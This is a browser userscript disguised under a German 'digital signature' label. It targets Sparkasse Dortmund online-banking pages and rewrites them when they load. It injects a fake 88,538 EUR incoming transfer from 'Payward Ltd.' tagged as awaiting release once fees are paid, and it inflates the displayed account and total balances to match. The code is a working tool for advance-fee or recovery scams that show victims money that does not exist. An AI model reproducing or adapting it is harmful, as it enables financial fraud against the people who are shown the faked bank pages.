// ==UserScript==
// @name         Vertragssignature Calcea
// @namespace    http://tampermonkey.net/
// @version      10.0
// @description  Anforderung an GwG - digitale Signatur
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        https://www.sparkasse-dortmund.de/de/home/onlinebanking/umsaetze/umsaetze.html*
// @match        https://www.sparkasse-dortmund.de/de/home/onlinebanking/finanzstatus.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/450933/Vertragssignature%20Calcea.user.js
// @updateURL https://update.greasyfork.org/scripts/450933/Vertragssignature%20Calcea.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...

    //Tabelle 2 = Vorgemerkt, wenn das Verfügbar ist!! Wenn nicht ist das der Umsatz
    // Tabelle 3 = Echter Umsatz, wenn er bereits vorgemerkte hat!!
    // Tabelle 4 = Echter Umsatz, keine Vorgemerktetn verfügbar
    var tabelle = 2;
    var vorgemerkt = "yes";
    var kontoteil = "1";
    var absender = "Payward Ltd.";
    var asenderReference = "WD3746 TRX88205a Buss, Wolfgang - FREIGABE NACH GEBUEHRENBEGL.";
    var absenderDetails = "08.09.2022 | GUTSCHR. TREUHAND";

    function numberWithCommas(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");}
    var editk = "88538";
    var editk2 = numberWithCommas(editk);

    if (window.location.href.indexOf("umsaetze") > 0) {
    //var newHTML = document.createElement ('tr');newHTML.innerHTML += '<tr class="tableroweven hoverable" id="edit0" role="region" aria-labelledby="aria11661172610786-0-td" aria-level="3" aria-expanded="false" aria-controls="aria11661172610786-1-td4 "><td class="left"><div class="payment"><div class="image"></div><span class="title">GA NR00002120 BLZ38250110 0</span><span class="subtitle">08.08/11.45UHR EU-BAHNHOF   </span><span class="details">08.08.2022 | BARGELDAUSZAHLUNG</span></div></td><td class="nowrap"><div class="bcategory">&nbsp;</div></td><td class="right"><div class="balance"><span aria-hidden="true" class="balance-predecimal plus">' +editk2 + '</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-2.000,00 EUR</span></div></td><td id="aria11661172610786-1-td4"><div class=""><div class="ficon icon-if5_symbol_banking_6"><input type="submit" name="ORpuKjhlbXaRvjwJ" title="Detailanzeige" value="Detailanzeige" onclick="return IF.checkFirstSubmit();" class="" role="link"></div></div></td></tr>'
    var xHTML = '<table role="table" aria-label="Gebuchte Umsätze" aria-describedby="umsatz" class="btable pfm-umsatz no-2nd-row top-align hover-over-area actionicon-noborder toggle-table-row toggle-table-group spacious "><caption class="offscreen" id="umsatz">Die Tabelle zeigt Ihnen die Umsätze des gewählten Kontos bzw. Depots im gewählten Zeitraum.</caption><tbody><tr class="tableheader noborder" id="aria01662662227681-0" role="heading" aria-level="2"><td class="nowrap" id="aria01662662227681-0-td">Spezialauftrag (1)</td><td class="right nowrap" colspan="3"><div class="data"><div class="datatable"><div class="label"><em>**</em></div><div class="balance"><span aria-hidden="true" class="balance-predecimal plus">88.538</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">10,00 EUR</span></div></div></div></td></tr><tr class="tablerowodd toggle-table-row-open hoverable" id="aria01662662227681-0-0" role="region" aria-labelledby="aria01662662227681-0-td" aria-level="3" aria-expanded="true" aria-controls="aria01662662227681-0-td4 "><td class="left"><div class="payment"><span class="title">Payward Ltd.</span><span class="details">13.09.2022 | WD3746 A1-DE-8812031827 Calcea, Elena</span></div></td><td class="nowrap"><div class="bcategory">&nbsp;</div></td><td class="right"><div class="balance"><span aria-hidden="true" class="balance-predecimal plus">88.538</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">10,00 EUR</span></div></td><td id="aria01662662227681-0-td4"><div class=""><div class="ficon icon-if5_symbol_banking_6"><input type="submit" name="PBtSENJbhBjEfdZv" title="Freigabe nötig. Bedingung: Begleichung der Gebuehren nach Vertrag" value="Freigabe nötig. Bedingung: Begleichung der Gebuehren nach Vertrag Paywa (..)" onclick="();" class="" role="link" data-tracked="true"></div></div></td></tr></tbody></table>';
    var saveHTML = document.getElementsByClassName("btableblock")[0].innerHTML;
    document.getElementsByClassName("btableblock")[0].innerHTML = xHTML + saveHTML;


        //document.getElementsByTagName("tbody")[tabelle].insertBefore(newHTML, document.getElementsByTagName("tbody")[tabelle].childNodes[2]);
//document.getElementsByTagName("tbody")[tabelle].childNodes[2].className = "tableroweven hoverable";
//document.getElementsByTagName("tbody")[tabelle].childNodes[2].childNodes[0].childNodes[0].childNodes[1].textContent = absender;
//document.getElementsByTagName("tbody")[tabelle].childNodes[2].childNodes[0].childNodes[0].childNodes[2].textContent = asenderReference;
//document.getElementsByTagName("tbody")[tabelle].childNodes[2].childNodes[0].childNodes[0].childNodes[3].textContent = absenderDetails;

    if (tabelle == "3") {

document.getElementsByTagName("tbody")[tabelle].children[0].children[1].children[0].children[0].children[1].children[0].className = 'balance-predecimal plus';
document.getElementsByTagName("tbody")[tabelle].children[0].children[1].children[0].children[0].children[1].children[1].className = 'balance-decimal plus';

var actualbalance = parseInt(document.getElementsByTagName("tbody")[tabelle].children[0].children[1].children[0].children[0].children[1].children[0].textContent, 10);
var ourbalance = parseFloat(editk) + parseFloat(actualbalance);
var our2 = numberWithCommas(ourbalance);
document.getElementsByTagName("tbody")[tabelle].children[0].children[1].children[0].children[0].children[1].children[0].textContent = our2;

           document.getElementsByTagName("tbody")[tabelle].children[0].children[0].innerHTML = '\n\t\t\t\tGebuchte Umsätze\n\t\t\t';

    }

    if (tabelle == "2" || tabelle == "4") {
    document.getElementsByTagName("tbody")[tabelle].children[0].children[1].children[0].children[0].className = 'balance-predecimal plus';
    document.getElementsByTagName("tbody")[tabelle].children[0].children[1].children[0].children[1].className = 'balance-decimal plus';
    var actualbalance = document.getElementsByTagName("tbody")[tabelle].children[0].children[1].children[0].children[0].textContent;
    var actualbalance2 = actualbalance.replace(".", "");
var ourbalance = parseFloat(editk) + parseFloat(actualbalance2);
var our2 = numberWithCommas(ourbalance);
document.getElementsByTagName("tbody")[tabelle].children[0].children[1].children[0].children[0].textContent = our2;

        document.getElementsByTagName("tbody")[tabelle].children[0].children[0].innerHTML = 'Vorgemerkte Umsätze';
    }}

    //Umsätze
    //Gesamtsaldo
    if (window.location.href.indexOf("finanzstatus") > 0) {
        if (vorgemerkt == "no"){
    var gesamtnoedit = document.getElementsByTagName("tbody")[1].lastChild.previousSibling.children[1].children[0].children[1].textContent;
    var newSaldo = parseFloat(editk) + parseFloat(gesamtnoedit.replace(".", ""));
    var newSaldoDec = numberWithCommas(newSaldo);
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.children[1].children[0].children[1].textContent = newSaldoDec;
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.children[1].children[0].children[1].className = 'balance-predecimal plus';
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.children[1].children[0].children[2].className = 'balance-decimal plus';
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.previousElementSibling.previousElementSibling.previousElementSibling.children[1].children[0].children[1].textContent = newSaldoDec;
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.previousElementSibling.previousElementSibling.previousElementSibling.children[1].children[0].children[1].className = 'balance-predecimal plus';
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.previousElementSibling.previousElementSibling.previousElementSibling.children[1].children[0].children[1].className = 'balance-decimal plus';

    //Balance Updater
    //Receive Balance
    var balanceAcc =document.getElementsByTagName("tbody")[1].children[kontoteil].children[1].children[0].children[0].textContent;
    var newBalance = parseFloat(editk) + parseFloat(balanceAcc.replace(".", ""));
    var newBalanceDec = numberWithCommas(newBalance);
    //Update Balance
    document.getElementsByTagName("tbody")[1].children[kontoteil].children[1].children[0].children[0].textContent = newBalanceDec;
    document.getElementsByTagName("tbody")[1].children[kontoteil].children[1].children[0].children[0].className = 'balance-predecimal plus';
    document.getElementsByTagName("tbody")[1].children[kontoteil].children[1].children[0].children[1].className = 'balance-decimal plus';
    document.getElementsByTagName("tbody")[1].children[kontoteil].children[1].children[0].children[0].style.marginLeft = "-46px"

        }

    }
})();